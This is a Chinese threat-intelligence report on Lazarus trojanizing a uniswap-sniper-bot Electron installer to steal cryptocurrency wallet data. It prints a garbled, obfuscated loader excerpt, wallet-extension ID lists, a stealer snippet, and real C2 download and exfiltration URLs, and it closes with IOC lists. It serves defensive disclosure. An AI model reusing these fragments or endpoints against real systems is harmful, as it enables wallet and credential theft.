@@ -1,0 +1,167 @@
+# APT-C-26（Lazarus）组织持续升级攻击武器，利用Electron程序瞄准加密货币行业  
+
+原创高级威胁研究院360威胁情报中心2025年01月20日18:15北京  
+
+# APT-C-26  
+
+# Lazarus  
+
+APT-C-26（Lazarus）组织是一个高度活跃的APT组织。该组织除了对金融机构和加密货币交易所感兴趣外，也对全球的政府机构、航空航天、军工等不同行业开展攻击活动，主要目的是获取资金和窃取敏感信息等。其攻击方式主要包括网络钓鱼、网络攻击和勒索软件攻击，并且它们的攻击行为具有高度的技术复杂性和隐蔽性，也具备Windows、Linux、MacOS系统攻击能力，以及拥有多种攻击载荷武器。  
+
+360高级威胁研究院捕获到了Lazarus组织利用Electron打包的恶意程序，该程序伪装成货币平台的自动化交易工具安装包，被用来对加密货币行业相关人员进行攻击。一旦受害者点击Electron打包的恶意程序，首先会显示正常的安装过程，但是在后台会运行恶意功能，然后通过层层加载，最终完成攻击行为。鉴于该组织近期频繁通过恶意安装程序针对多个平台进行渗透，并且在观察中发现其代码混淆也持续升级，因此我们在这里进行详细分析，希望经过曝光披露，相关的企业和个人可以提高安全防范意识，保护企业财产和相关用户财产免受损失。  
+
+## 一、攻击活动分析  
+
+### 1.攻击流程分析  
+
+本轮攻击中，Lazarus组织通过毒化uniswap-sniper-bot项目，并使用Electron打包成可执行文件进行投递，一旦用户运行就会下载执行恶意代码，盗取敏感信息，本文重点描述这类攻击方式(图中标红部分)。之前，该组织还利用过Python存储库PyPl、nodejs项目以及视频软件进行投毒攻击，此类本文不再详细分析。但是这类攻击流程大同小异，其流程图如下：  
+
+  
+
+### 2.载荷投递分析  
+
+Lazarus组织近日进行投递的部分样本信息如下：  
+
+<html><body><table><tr><td>MD5</td><td>48c179680e0b37d0262f7a402860b2a7</td></tr><tr><td>文件名称</td><td>uniswap-sniper-bot-with-guiSetup1.0.0.exe</td></tr><tr><td>文件大小</td><td>70.68MB 3 (74110128 bytes)</td></tr></table></body></html>  
+
+该样本免杀效果很好，在VirusTotal多引擎检测中只有极少数厂商报毒。运行该程序，首先会进行uniswap-sniper-bot正常安装以迷惑用户，uniswap-sniper-bot-with-gui是个开源项目(https://github[.]com/meta-dapp/uniswap-sniper-bot),它是一个用于类似交易所（DEX）平台的自动化交易工具，通常是为了帮助用户自动化购买新上线的代币或快速抢购热门代币。  
+
+  
+
+与此同时，该样本在执行安装的过程中后台会进行恶意代码的下发。仔细分析发现该样本是利用Electron打包编译而成，Electron是一个开源框架，它结合了Chromium和Node.js，使得开发者可以使用Web 技术来构建桌面应用，并且支持Windows、macOS和Linux等平台，由此也可以看出该组织具备多平台攻击的能力。  
+
+将Electron程序进行反编译，首先解压EXE程序找到app.asar进行反编译，解压后的结果如下：  
+
+  
+
+通过分析对比，发现位于\src\helpers下的TokenHashjs被profits.js加载，而profits.js被mainjs加载，但是对比uniswap-sniper-bot官方源代码，发现并没有引用该TokenHash.js，因此判断该脚本是lazarus组织嵌入的恶意代码。  
+
+  
+
+  
+
+打开该文件发现此脚本经过严重混淆，在之前捕获的此类攻击中并没有这么混淆，由此也可以看出该组织在不遗余力的进行载荷升级。  
+
+# TokenHash j=  
+
+（funotlon（_0x1b827a,_0x7631d）oonst_0x2978d5=_0x1b827a(）;funotlon_0x17b1c8(_0x3c62e8,_0x265e47,_0x55774,_ox353faf,_0x422895){return_0xe949(_0x422895-0x136,_0x353faf）) funotlon0x48260（0x2d4ab,0x5d192,0x49777,0x3db90f,0x1e0829）（return0xe949（0x1e082--0x16c,0x3db50f）;）funetlon0x2feb（0x325ddf,0x11d68f,0x2c8ebB，0x2112d, 0x573369)(return_0xe549（_0x325ddf-0x3b8,_0x11d68f）;)funotion_0x5c97b5（_0x3cd07f，_0x43ee41,_0x55bc44,_0x5ea82f,_0x442b33)(return_0xe949(_0x43ee41-0xe4,_0x3cd07f）:)function 0x3e28e（0x57673,0x60375，0x3bb4,0x700d，0x264bfa){retu0xe549（0x264ba-0x3d，0x460375）h1（11）try（const0xd0ab-parseInt（0x48260（0xd0x1f,0x5 0x156，0xb3））/(0x5d5+-0x1\*0x10c1+0xaed）\*（parseInt(_0x17b1c8（0x3da,0x3ca,0x4cB'，0x4tf，0x41d）)/（-0x47\*-0xbb+0x12e5\*-0x1+-0x13a2））+-parseInt（_0x17b1c8（0x3a2,\*0x2fc',0x455,0x3d2， 0x37/（0x190xx6a5+0xx33d+nt（0x597b9x3430x20x2780x24x20））（-x2+0x0x28x）（pan（0x597b9（x390x370xa00xx51 ）/（-x5+0xd7-x2+0x29d））+paInt（0x260（0xEbDx1Dx24,x200,0x160°）/（0x1-0x239x10x3a5+0x29-ca）\*（-paInt（0x260（0x17d，0x12d0x，0x14，0xb6 )/(0x157e+0x125e+=0x27d3））+-parseInt（_0x3ef28e（0x7081,0x6e6,0x741,0x72c',0x6d6))/（-0x2\*0x11d7+-0x15b7+-0x1\*-0x3d6d）\*（paxeInt(_0x3e28e(0x70,0x63，10x6ba，0x605,0x680))/（ 0xb44+-0x266+-0x11\*0x5））+parseInt（_0x2fae5b（0x71a，0x775,0x74,0x6b4,0x6d5）)/（-0x33+x1150+-0x=13）+parseInt(_0x3e28e（0x61b0x646,0x540,0x6b2,0x5E5））/（-0x2216\*-0x1+-0x154 +0x5\*0x26）\*（parseInt（0x5c97b9（0x1e1,0x2e7，10x1de，0x3a0,0x208))/(0x6\*-0x1cd+-0x8\*0x43b+0x6\*0x773）);1f（0xd0a88b0x7631d）break;e1se_0x2978d5[push'](_0x2978d5[shift 10）;lcatch（0x364dd1）(_0x2978dS[push']（_0x2978d5[shift]0);11)（_0xd780,0x12927+-0x1406ad\*0x1+0x3-0xb557d))const_0x884854-(funotion()(1et_0x45d06f-11[1;return function( 0x1cbedc,_0xe3be3）(const_0x322ff8-_0x45d06f?function()(function_0x3c7c7b(_0x3c351b,_0xf93516,_0x262f0e,_0x2e63c4,_0x311a42)(return_0xe949（_0x262f0e--0x3ab，_0x311a42）;) funotlon0x135a70(0x1508a2,0x4cbd50,_0x2ba899,0x191bad,0x1ad64d）(return0xe949(_0x4cbd50--0x345,_0xlad64d）1funetlon0x2d7b56（0x71e803,_0x2a794a,0x3545b3,0x387ac9, 0x5e5723）（return0xe549（0x387ac9-\*0x17b_0x2a794a）}1f（0xe3bc3）)(1f（0x2d7b56（0x419，0x44e0x4d2,0x450°,0x518)-0x2d7b56（0x4b,0x4700x46e,0x4d,0x530\*)(aonst 0x48db51=_0xe3bc3[_0x3c7c7b（-0x289,-0x19o,-0x1f1,-0x2a6',-0x1c6')](_0x1cbedc,argumenta);zeturn_0xe3bc3=nul1,_0x48db51;)elsezeturn1[1];)}:funotion()();xaturn_0x45d06f=1[1, 0x322ff8;);)()）,_0x28c160=0x884854（this,funat1on()（funot1on_0x590dc7（_0xb263bf,_0x5e979d,_0x3a1931,_0x16735d,_0x2f24d5)（return_0xe949（_0xb263bf-0x75,0x5e979d）;}funot1on 0xe949（0x7227-0x00x91ea:1function0x29b35（0x453d25,0xa17b,0x1ade3,0xcc63f1,0x182549){return0xe949（0x1a9de3--0x1d0x182549）:functon0xa9dcec（0x2ee9c2 0xf67586(_0x1bee05,_0x714bf,_0x3d1d96,_0x5cdfcc,_0x3bc795）{return_0xe949(_0x5cdfce-0x30e，_0x1bee05);)function_0x3b7a43(_0x91eaa8,_0x4cad98,_0x7e227,_0xceae3d,_0x504b5c){retuzn 0x5641fe,0x4896c4,0xb536a5,0x3feBba)(return0xe949（_Oxb536a5--0x209,0x2ee9c2）)return0x28c160L0x590do7(0x23d0x3100x26e，0x2b,0xla1)+0x29bc35（0x324,0x1c9, 0x26e，0x270，0xfc）10)[_0x590do7（0x232，0x1d7，0x220，0x235,0x264)+h】（_0xf67986（\*0x5e8，0x5df，0x44d，\*0x51c，0x5ob)+_0x590do7（0x2dc，\*0x202，0x2140x369，0x205)++\$）[ 0x3b7a43(0x12,0x384,0x2b8,0x284,0x2c2)+_0xa9deec(-0x1a,-0x40,0xe3',0x82,0x46）]0[_0x67986(\*0x4b6，0x54b,0x416,0x4ed，0x532）+_0xa9dcec(-0x18,-0x1a,-0x125，-0x3d 0x2f）+1（_0x28e160）[0x29bc35（0x16E,0x27，0x1a0,0x185,10x1c5)+h]（0x3b7a43（0x30,0x3el,0x2e，0x3cc²,0x300)+0x3b7a43（0x3dB，10x26b,0x357,0x38a，0x2f0）++）1） 0x28c160();function0xe949（_0x3a0183,_0x264bd8)const_0x5165bb=_0xd780():return_0x=945=function(0x1f4540,0x193ad6)(0x1f4540=_0x1f4540-(-0xcb6\*-0x2+-0x2473\*-0x1+0x35-0x123 )let0x5a5f6e=0x5165bb[_0x14540]:return0x5a5fe:1,0xe949（0x3a0183,_0x264bd8);1funetion0x2a2148（0x5410a5,0x7c646,0x168772,0x36b6c,_0x4db61){return_0xe549（0x4db61- -0x58°,_0x5410a5）)}const _0x327779-（function()（1et_0x22b70b-11[l;return function（_0x3fafa4,_0xc193e)（funation_0x2b155c（0x2484a8,_0x1c3bd3,_0x199f8f，_0x49ae81,_0x5e6976）1 return_0xe949（0x1c3bd30x141,0x5e6976);functlon_0x5cb71b（_0xc4cabf,0x34dbe,_0x1710ce,_0x11bab7,_0x228ab1）{return_0xe949(_0x1710ce--0x116,_0x228ab1);)function_0x28936b（ _0x3fcb78,_0x19886d,_0x45b549,_0x1f1ace,_0x5edc12)(return_0xe949（_0x19886d-0x379,_0x45b549):1function_0x2a5bdf(_0x1e3f72,_0x4f762e,_0x5676d6,_0x18752f,_0x150200)(return 0x0949（_0x18752f-0x239,_0x4f7620);)funotion_0x2e79a1(_0x40ee05,_0x54fd69,_0x105aab,_0x113550,_0x157dd1)(return_0xe949(_0x40e05--0x1f1,_0x54fd69);)1f（_0x2079al（-0x14,0x91 -0x1f，0x37,-0x32）1--0x2079a1（0x9,0x18d,0x7,0x46,0x186))(const_0x437a38=0x22b70bfunction(0（functlon0x13610（_0x4fa035,_0x47791b，_0x353c53,0x4017d4,_0x2c412a）（xetuzn 0x5cb71b（0x4e035-0x35,0x4771b0x1ab，0x47751b-0x1e6,0x4017d4-0x50x2e412）;）uneon0x493e4（0x20a7ed，0x2110bd,0x574686,0x2560d6,0x120752）（reurn0x5eb71b _0x20a7cd-\*0x67',_0x2110bd-0x100,_0x20a7cd-\*0x401',_0x2560d6-0xe0',_0x120792);)funet1on_0x26143b(_0x1fdnef,_0x544577,_0x3bb4en,_0x48fb0d,_0x37f783){xeturn_0x5cb71b(_0x1fdaef  
+
+### 3.载荷功能分析  
+
+对上述提到的TokenHash.js进行去混淆，解混淆后可以看到其代码首先定义了多个浏览器加密钱包扩展程序ID。  
+
+const _0x4530a4=["Local/BraveSoftware/Brave-Browser","BraveSoftware/ Brave-Browser","BraveSoftware/Brave-Browser"];   
+const _ox1edb6a =["Local/Google/Chrome","Google/Chrome",“google-chrome"]; const _0x490b84 =["Roaming/0pera Software/0pera Stable","com.operasoftware. Opera","opera"];   
+const _ox21c9c3=["nkbihfbeogaeaoehlefnkodbefgpgknn",   
+"ejbalbakoplchlghecdalmeeeajnimhm","fhbohimaelbohpjbbldcngcnapndodjp", "ibnejdfjmmkpcnlpebklmnkoeoihofec","bfnaelmomeimhlpmgjnjophhpkkoljpa", "aeachknmefphepccionboohckonoeemg","hifafgmccdpekplomjjkcfgodnhcellj" "jblndlipeogpafnldhgmapagcccfchpi","acmacodkjbdgmoleebolmdjonilkdbch" "dlcobpjiigpikoobohmabehhmhfoodbb","mcohilncbfahbmgdjkbpemcciiolgcge" "agoakfejjabomempkjlepdflaleeobhb","omaabbefbmiijedngplfjmnooppbclkk" "aholpfdialjgjfhomihkjbmgjidlcdno","nphplpgoakhhjchkkhmiggakijnkhfnd", "penjlddjkjgpnkllboccdgccekpkcbin","lgmpcpglpngdoalbgeoldeajfclnhafa", "fldfpgipfncgndfolcbkdeeknbbbnhcc","bhhhlbepdkbapadjdnnojkbgioiodbic", 'gjnckgkfmgmibbkoficdidcljeaaaheg","afbcbjpbpfadlkmhmclhkeeodmamcflc"];  
+
+接着根据Brave、chrome和opera浏览器的默认存储路径，窃取其钱包数据并回传到[http://86.104.74[.]51:1224/uploads。  
+
+  
+
+然后从地址http://86.104.74[.]51:1224/pdown下载python安装包，便于后续代码执行，以及从地址[http://86.104.74[.]51:1224/client/7/702下载后续载荷并保存为%userprofile%\.sysinfo执行。  
+
+  
+
+下载的.sysinfo是一个python脚本，经过49层解码再解压缩得到原始代码如下所示。  
+
+  
+
+其功能为下载器，从86.104.74.51地址下载插件用于后续攻击活动，后续插件的功能和我们之前对Lazarus组织该类型载荷的追踪中对比发现并无变化，故在次只对其进行简要分析说明。  
+
+#### 插件1:  
+
+下载地　址　：http://86.104.74[.]51:1224/payload/7/702　，保存为%userprofile%\.n2\pay，功能为主机监控，文件窃取，执行shell指令并设置anydesk等。  
+
+  
+
+#### 插件2:  
+
+下载地　址　：http://86.104.74[.]51:1224/bow/7/702，保存为%userprofile%\.n2\bow， 功能为窃取Chrome, Brave, Opera, Yandex, MsEdge数据。  
+
+host1='86.104.74.51   
+host2=f'http://{host1}:1224   
+class BrowserVersion:   
+def_str_(A):returnA.base_name   
+def_eq_(A,_o):return A.base_name==   
+class Chrome(BrowserVersion):base_name =“chrome";v_w =["chrome",“chrome dev", "chrome beta",“chrome canary"];v_1 = ["google-chrome",“google-chrome-unstable",“google-chrome-beta"];v_m =["chrome","chrome dev",“chrome beta","chrome canary"]   
+class Brave(BrowserVersion）:base_name ="brave";vw = ["Brave-Browser",“Brave-Browser-Beta",“Brave-Browser-Nightly”];v_1 =["Brave-Browser","Brave-Browser-Beta","Brave-Browser-Nightly"];v_m =["Brave-Browser","Brave-Browser-Beta", "Brave-Browser-Nightly"]   
+class Opera(BrowserVersion):base_name =“opera";v_w =["Opera Stable",“Opera Next",“Opera Developer"];v_1 =["opera”, "opera-beta", "opera-developer"];v_m = ["com.operasoftware.Opera", "com.operasoftware.OperaNext", "com.operasoftware. OperaDeveloper"]   
+class Yandex(BrowserVersion):base_name =“yandex";v_w =["YandexBrowser"];v_1 =["YandexBrowser"];v_m =["YandexBrowser"] class MsEdge(BrowserVersion):base_name =“msedge";v_W =["Edge"];v_1 =[];v_m=[]  
+
+#### 插件3：  
+
+下载　地　址　： http://86.104.74[.]51:1224/mclip/7/702, 保存为%userprofile%\.n2\mlip，功能为键盘监控、剪切板记录和窗口监控。  
+
+  
+APT-C-26（Lazarus）组织持续升级攻击武器，利用Electron程序瞄准加密货币行业  
+
+## 二、关联分析  
+
+早期我们也捕获到了多个Lazarus组织使用的带毒恶意程序包，主要以下几类：第一类是利用Python存储库PyPl，其具体分析参见360高级威胁研究院今年早期发布的文章[1l；第二类是利用node.js的npm包，其过程跟PyPI类似，可以参考phylum公司文章[2；第三类也是近期伪装的视频软件安装包，目标人员一旦打开这类带毒的安装包后，恶意代码便会下载安装基于Python的后续载荷，从而展开窃密活动，部分样本信息如下所示，存在Windows和MacOS版本。  
+
+<html><body><table><tr><td>MD5</td><td>文件名</td><td>针对平台</td></tr><tr><td>8ebca0b7ef7dbfc14da3ee39f478e880</td><td>FCCCall.m si</td><td>Windows</td></tr><tr><td>1bb8b1d0282727ab9bc2deb3570cf272 bc14c3ab8316e7ec373829ea7a6e2166</td><td>FCCCall.d mg</td><td>MacOs</td></tr></table></body></html>  
+
+这类样本后续执行的流程跟本次分析的样本类似，但是样本没有经过强混淆，没使用Electron打包成可执行程序，伪装的载体以及C&C服务器也都不一致，这也可以看出攻击者在不断升级攻击组件，具体分析不再详述，可以参考Group-IB 公司文章[3]。  
+
+## 三、归属研判  
+
+根据对Lazarus组织近期攻击事件的深入分析，发现该组织具有较为鲜明的攻击目的，以及技术特征，具体总结如下：  
+
+1）Lazarus组织近期为了擢取经济利益，基本都是以加密货币从业者，或者和加密货币高度相关的人群作为攻击对象，通过毒化加密货币开源项目，然后诱使受害者下载运行编译好的带毒的程序，从而实现窃取信息等目的。  
+
+2）Lazarus组织近年来经常使用Python，JavaScript相关武器库，在本次攻击事件中，攻击者通过投毒UniswapSniperBot项目进行攻击，UniswapSniperBot使用JavaScript进行开发，这和Lazarus近期利用node.js项目攻击手法相吻合。只是这次使用了Electron框架打包，以便用户更容易执行。  
+
+3）本次攻击样本回连的C&C服务端，其端口和近期披露的Lazarus攻击事件相吻合，都是1224或1244端口，回连的URL中，都含有uploads，pdown，/client/[数字]等字段。  
+
+通过上述特点，本次攻击归属于Lazarus组织。  
+
+在本次详尽的攻击分析中，我们揭秘了APT-C-26组织如何巧妙地利用uniswap-sniper-bot项目执行恶意代码的全过程，并且执行过程中都是层层递进，关键代码也经过了强混淆，具备相当强的隐蔽性，通过一系列执行达到窃取用户信息的目的。此外，攻击组织针对Windows、Linux、macOS系统都具备相当强的攻击攻击能力，并且有大量IP资产，这都体现出该组织背后有强大的经济能力支撑，以及对目标人群的意志坚定性。因此在这里提醒相关企业和个人加强安全意识，无论何种操作系统，切勿执行未知样本。这些行为可能导致系统在没有任何防范的情况下被攻陷，从而导致机密文件和重要情报的泄漏。  
+
+另外，本文披露的相关恶意代码、C&C只是APT-C-26组织近期攻击过程中使用的攻击武器，该组织不会因为一次攻击行动的暴露而停止活动，反而会持续更新其载荷，后期我们也将持续关注该组织的攻击活动。  
+
+# 附录10C  
+
+# MD5:  
+
+48c179680e0b37d0262f7a402860b2a7  
+8ebca0b7ef7dbfc14da3ee39f478e880  
+1bb8b1d0282727ab9bc2deb3570cf272  
+bc14c3ab8316e7ec373829ea7a6e2166  
+61279d5e30f493bbdae9eab8ca99e9a4  
+2a8e4281213e4aaa485612f9ded261a2  
+457bb40c6fc10b3cd5a3b51e4eb672b2  
+eac8edaf5a4637fd964d7a3d87f8189a  
+bf82e3b5d25d167c168cc6600e797c53  
+
+# c&C:  
+
+86.104.74[.]51:1224   
+45.128.52[.]14:1224   
+45.137.213[.]30:1224   
+165.140.86[.]227:1244   
+38.92.47[.]151:1244   
+23.106.253[.]215:1244   
+38.92.47[.]85:1244   
+138.201.199[.]46:1224   
+45.43.11[.]201:1244   
+147.124.214[.]129:1244   
+167.88.168[.]152:1224   
+185.235.241[.]208:1224   
+95.164.17[.]24:1224  
+
+## 参考  
+
+## 团队介绍  
+
+TEAM INTRODUCTION  
+
+### 360高级威胁研究院  
+
+360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。  
+
+#APT 149#朝鲜半岛 35#APT-C-26Lazarus14  
+
+APT·目录 $\equiv$  
+
+<上一篇·近些年APT-C-60（伪猎者）组织使用的载荷分析  
